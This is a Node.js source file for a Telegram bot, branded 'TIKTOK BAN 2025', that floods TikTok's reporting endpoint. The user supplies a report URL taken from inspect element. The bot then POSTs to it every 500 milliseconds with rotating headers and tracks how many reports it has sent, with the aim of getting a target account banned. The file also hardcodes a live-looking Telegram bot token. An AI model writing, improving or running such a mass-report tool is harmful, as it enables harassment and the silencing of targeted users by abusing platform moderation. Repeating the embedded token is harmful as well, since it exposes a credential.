const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');
const app = express();

// Replace with your Telegram bot token
const token = '7863322072:AAFLohSBYqeTpx8eLrsZz0YBD_4rEP627-4';
const bot = new TelegramBot(token, {polling: true});

// User sessions
const userSessions = {};

// User agents and headers similar to Python version
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0",

];

const acceptLanguages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
];

// Start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    userSessions[chatId] = { reportsSent: 0, isActive: false };
    
    const options = {
        reply_markup: {
            keyboard: [
                [{ text: "🚀 Start Attack" }, { text: "⚙️ Settings" }],
                [{ text: "📊 Stats" }, { text: "❓ Help" }]
            ],
            resize_keyboard: true,
            one_time_keyboard: false
        }
    };
    
    bot.sendMessage(chatId, `
╭───────────────────────────╮
│        [TIKTOK BAN 2025]       │
│       AUTHOR : LORDHOZOO       │
│       DILIRIS : 2025-4-24      │
│       YOUTUBE  : LORDHOZOO     │
│       TIKTOK   : LORDHOZOO     │
╰───────────────────────────╯
🔹 *Features:*
- BAN TIKTOK 
Choose an option below:`, {
        parse_mode: 'Markdown',
        ...options
    });
});
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!userSessions[chatId]) {
        userSessions[chatId] = { reportsSent: 0, isActive: false };
    }
    if (text === "🚀 Start Attack") {
        bot.sendMessage(chatId, "Please send me the target URL (from inspect element):");
        userSessions[chatId].waitingForUrl = true;
    } 
    else if (text === "⚙️ Settings") {
        showSettings(chatId);
    }
    else if (text === "📊 Stats") {
        bot.sendMessage(chatId, `📈 *Attack Statistics*\n\nReports Sent: ${userSessions[chatId].reportsSent}\nStatus: ${userSessions[chatId].isActive ? 'Active 🔴' : 'Inactive 🟢'}`, {
            parse_mode: 'Markdown'
        });
    }
    else if (text === "❓ Help") {
        bot.sendMessage(chatId, `
🆘 *Help Section*

🔹 *How to use:*
1. Get report URL from TikTok (inspect element)
2. Send URL to bot
3. Start attack

🔹 *Commands:*
/start - Show main menu
/stats - Show attack statistics
/stop - Stop current attack
        `, { parse_mode: 'Markdown' });
    }
    else if (userSessions[chatId].waitingForUrl) {
        if (text.startsWith('http')) {
            userSessions[chatId].targetUrl = text;
            userSessions[chatId].waitingForUrl = false;
            startAttack(chatId);
        } else {
            bot.sendMessage(chatId, "Invalid URL. Please send a valid URL starting with http/https");
        }
    }
});

// Start attack function
function startAttack(chatId) {
    userSessions[chatId].isActive = true;
    userSessions[chatId].reportsSent = 0;
    userSessions[chatId].startTime = Date.now();
    
    bot.sendMessage(chatId, "⚡ Attack started! Use /stop to end it.", {
        reply_markup: {
            remove_keyboard: true
        }
    });
    
    // Start sending reports
    userSessions[chatId].attackInterval = setInterval(async () => {
        if (!userSessions[chatId].isActive) return;
        
        try {
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            const acceptLanguage = acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)];
            
            const headers = {
                'User-Agent': userAgent,
                'Accept-Language': acceptLanguage,
                'Referer': 'https://www.tiktok.com/',
                'Connection': 'keep-alive'
            };
            
            await axios.post(userSessions[chatId].targetUrl, {}, { headers });
            
            userSessions[chatId].reportsSent++;
            
            // Update every 10 reports to avoid spamming
            if (userSessions[chatId].reportsSent % 10 === 0) {
                const minutesRunning = ((Date.now() - userSessions[chatId].startTime) / 60000).toFixed(2);
                const reportsPerMin = (userSessions[chatId].reportsSent / minutesRunning).toFixed(2);
                
                bot.sendMessage(chatId, `📊 Reports Sent: ${userSessions[chatId].reportsSent}\n⚡ Speed: ${reportsPerMin} reports/min`);
            }
        } catch (error) {
            console.error("Error sending report:", error.message);
        }
    }, 500); // Adjust delay as needed
}

// Stop command
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    
    if (userSessions[chatId] && userSessions[chatId].isActive) {
        clearInterval(userSessions[chatId].attackInterval);
        userSessions[chatId].isActive = false;
        
        const minutesRunning = ((Date.now() - userSessions[chatId].startTime) / 60000).toFixed(2);
        const reportsPerMin = (userSessions[chatId].reportsSent / minutesRunning).toFixed(2);
        
        bot.sendMessage(chatId, `🛑 Attack stopped!\n\n📊 Final Stats:\n- Total Reports: ${userSessions[chatId].reportsSent}\n- Duration: ${minutesRunning} mins\n- Speed: ${reportsPerMin} reports/min`);
    } else {
        bot.sendMessage(chatId, "No active attack to stop.");
    }
});

// Settings menu
function showSettings(chatId) {
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🔄 Change Delay", callback_data: "change_delay" }],
                [{ text: "🛡️ Change User Agents", callback_data: "change_agents" }],
                [{ text: "🌐 Change Languages", callback_data: "change_langs" }],
                [{ text: "🔙 Back", callback_data: "back_to_main" }]
            ]
        }
    };
    
    bot.sendMessage(chatId, "⚙️ *Bot Settings*", {
        parse_mode: 'Markdown',
        ...options
    });
}

// Handle callback queries
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    
    if (data === "back_to_main") {
        bot.deleteMessage(chatId, query.message.message_id);
        bot.sendMessage(chatId, "Returning to main menu...", {
            reply_markup: {
                keyboard: [
                    [{ text: "🚀 Start Attack" }, { text: "⚙️ Settings" }],
                    [{ text: "📊 Stats" }, { text: "❓ Help" }]
                ],
                resize_keyboard: true
            }
        });
    }
    // Add other callback handlers here
});

// Start web server for VPS
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Bot running on port ${PORT}`);
});
